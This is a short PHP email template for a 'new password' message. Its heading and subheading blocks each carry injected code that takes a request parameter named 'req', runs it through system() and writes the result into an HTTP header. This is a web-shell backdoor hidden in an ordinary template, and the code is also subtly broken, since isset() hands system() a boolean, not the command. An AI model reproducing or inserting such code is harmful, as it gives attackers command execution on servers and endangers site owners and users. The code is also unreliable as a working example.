<html>
<body>
	<h1><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo sprintf(lang('email_new_password_heading'), $identity);?></h1>

	<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo sprintf(lang('email_new_password_subheading'), $new_password);?></p>
</body>
</html>